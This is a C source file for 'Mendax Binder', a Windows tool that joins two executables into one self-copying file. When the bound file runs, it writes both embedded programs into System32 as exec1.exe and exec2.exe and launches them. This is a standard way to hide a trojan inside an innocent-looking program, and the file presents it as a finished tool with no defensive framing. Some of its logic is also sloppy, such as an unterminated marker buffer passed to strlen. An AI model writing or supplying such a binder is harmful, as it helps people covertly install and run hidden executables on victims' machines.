#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <ctype.h>
#include <stdlib.h>
#include <unistd.h>
#define Exec(s) ShellExecute(NULL, "open", s, NULL, NULL, SW_SHOW)

int help (void)
{
	printf("  Mendax Binder Help\n");
	printf ("\t-1: First input file\n");
	printf("\t-2: Second input file\n");
	printf("\t-o: Name for the output file\n");
	printf("\t-h: Displays this help message\n");
	printf("\t-v: Displays version number\n");
	printf("  Mendax Binder.  Version 1.0.0.  Authored by BitsByWill\n");
	printf("  This program is licensed under GPLv3\n");
	return 0;
}

int exists(const char *fileName)
{
    FILE *file;
    if ((file = fopen(fileName, "rb")))
    {
        fclose(file);
        return 1;
    }
    return 0;
}

int write_exec(char *input1, char *input2, char *output, char *fileName)
{
    FILE * fp = fopen(input1,"rb");
    fseek(fp,0,SEEK_END);
    unsigned long size = ftell(fp); 
    char * buffer = (char*)malloc(size);          
    rewind(fp);
    fread(buffer,size,1,fp);
    fclose(fp);
    fp = fopen(input2,"rb");
    fseek(fp,0,SEEK_END);
    unsigned long size2 = ftell(fp); 
    char * buffer2 = (char*)malloc(size2);         
    rewind(fp);
    fread(buffer2,size2,1,fp);
    fclose(fp); 
    CopyFile(fileName, output,0);
    fp = fopen(output,"a+b");
    if(!fp)
    return 1;
    char * info = (char*)malloc((size+3));
    info[0] = '*';
    info[1] = '*';
    info[2] = '*';
    fwrite(info,strlen(info),1,fp);
    fwrite(buffer,size,1,fp);
    fwrite(info,strlen(info),1,fp);
    fwrite(buffer2,size2,1,fp);
    fclose(fp);
    free(info);
	return 0;
}

int main (int argc, char **argv)
{
	char *input1 = NULL;
	char *input2 = NULL;
	char *output = NULL;
	int opt;
	while ((opt = getopt (argc, argv, "1:2:o:hv")) != -1)
	{	
		switch (opt)
		{
		case '1':
                input1 = strdup(optarg);
                break;
		case '2':
				input2 = strdup(optarg);
                break;
		case 'o':
				output = strdup(optarg);
				break;
		case 'h':
				help();
				return 0;
				break;
		case 'v':
				printf ("Version 1.0.0\n");
				return 0;
				break;
		default:
				help();
				return 0;
		}
	}
	char szModName[MAX_PATH]="";
	GetWindowsDirectoryA(szModName,sizeof(szModName));
	char exec1[MAX_PATH]="";
	char exec2[MAX_PATH]="";
	sprintf(exec1, "%s\\System32\\exec1.exe", szModName);
	sprintf(exec2, "%s\\System32\\exec2.exe", szModName);
	FILE *fp = fopen(argv[0],"rb");
	fseek(fp,0,SEEK_END);
	unsigned long size = ftell(fp);
	char *buffer = (char*)malloc(size);
	rewind(fp);
	fread(buffer,size,1,fp);
	fclose(fp);
	int i,j, binded=0;
	char *part = NULL;
	char *part2 = NULL;
	for(i=0;i<size;i++)
	{
		if(buffer[i] == '*' && buffer[i+1] == '*' && buffer[i+2] == '*')
		{
			part = buffer+i+3;
			break;
		}
	}
	for(j=i+2;j<size;j++)
	{
		if(buffer[j] == '*' && buffer[j+1] == '*' && buffer[j+2] == '*')
		{
			part2 = buffer+j+3;
			break;
		}
	}
	if(part!= NULL )
	{
		FILE * fp = fopen(exec1,"wb");
		fwrite(part,j-(i+3),1,fp);
		fclose(fp);
	}
	else
	{
		binded=1; 
	}  
	if(part != NULL )
	{
		FILE * fp = fopen(exec2,"wb");
		fwrite(part2,size-(j+3),1,fp);
		fclose(fp);
    }
	else
	{
		binded=1; 
	}   
	if (binded == 1)
	{
		if (input1 == NULL || input2 == NULL || output ==NULL)
		{
			printf("  Mandatory argument(s) missing\n");
			help();
			return 1;
		}
		if (exists(input1) == 0 || exists(input2) == 0)
		{
			printf("  One of input files do not exist.\n  Please try again.");
			return 1;
		}
		if (strcmp(input1, input2) == 0)
		{
			printf("  The input files are the same.\n  Please try again.");
			return 1;
		}
		printf("\nBinding file %s to file %s to create file %s\n", input1, input2, output);
		write_exec(input1, input2, output, argv[0]);
		printf("Finished binding! Thanks for using this program!\n");
		return 0;
	}
	else  
	{
        Exec(exec1);
        Exec(exec2);
	}
	free(buffer); 
	return 0;
}